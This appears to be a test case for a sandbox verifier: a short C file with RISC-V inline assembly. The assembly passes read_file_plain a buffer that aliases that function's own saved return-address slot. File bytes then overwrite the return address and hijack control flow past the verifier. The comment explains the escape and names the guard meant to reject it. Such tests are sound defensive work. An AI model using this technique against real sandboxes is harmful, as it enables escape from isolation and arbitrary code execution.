#include "trusted_lib_api.h"
#include <stdint.h>

// Stage-1 escape: read_file_plain writes the file into a buffer that aliases its
// OWN saved-ra slot (sp-8). The verifier shims the call and models the return
// through the `ra` register, so it never sees the real stub reload `ra` from the
// clobbered slot (`ld ra,(N-8)(sp); ret`) -- at runtime that `ret` jumps into
// attacker-controlled file bytes the verifier never inspected. The frame-alias
// guard must reject the in-frame out-buffer.
static uint32_t lenbuf = 8;

ENTRY_POINT_ATTR void start()
{
    __asm__ volatile(
        "li   a0, 0x1337\n"     // handle (arbitrary)
        "addi a1, sp, -8\n"     // fbytes -> read_file_plain's own saved-ra slot
        "mv   a2, %0\n"         // len_ptr -> safe data cell (*len = 8)
        "li   t0, 0x80004000\n" // read_file_plain entry
        "jalr ra, 0(t0)\n"
        :
        : "r"(&lenbuf)
        : "a0", "a1", "a2", "t0", "ra", "memory");
    ENTRY_POINT_END();
}
